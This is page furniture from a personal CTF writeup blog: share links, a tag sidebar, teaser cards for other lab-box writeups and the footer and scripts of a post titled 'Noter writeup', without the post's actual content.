target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Noter writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Noter/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Noter/&amp;text=Noter writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shibboleth/"><div class="card-body"> <em class="timeago small" data-ts="1657371600" > 2022-07-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shibboleth writeup</h3><div class="text-muted small"><p> Summary This box focused on enumerating an udp port hosting an ipmi service for a hash which, when cracked could be leveraged into logging in to a zabbix service. Rooting the box was relatively str...</p></div></div></a></div><div class="card"> <a href="/posts/Unicode/"><div class="card-body"> <em class="timeago small" data-ts="1658062800" > 2022-07-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Unicode writeup</h3><div class="text-muted small"><p> Summary This box focuses on exploiting an authentication system using a jwt with an insecure jku parameter. After this, we can do unicode normalization to gain lfi, which will allow us to get a pas...</p></div></div></a></div><div class="card"> <a href="/posts/Faculty/"><div class="card-body"> <em class="timeago small" data-ts="1659877200" > 2022-08-07 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Faculty writeup</h3><div class="text-muted small"><p> Summary Foothold We start out by doing an nmap port scan: ┌──(bitis㉿workstation)-[~/Downloads] └─$ nmap -sC -sV 10.129.227.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 20:15 CEST Nma...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Shared/" class="btn btn-outline-primary" prompt="Older"><p>Shared writeup</p></a> <a href="/posts/Tar_and_feathers/" class="btn btn-outline-primary" prompt="Newer"><p>Tar and Feathers - FE-CTF 2022 writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
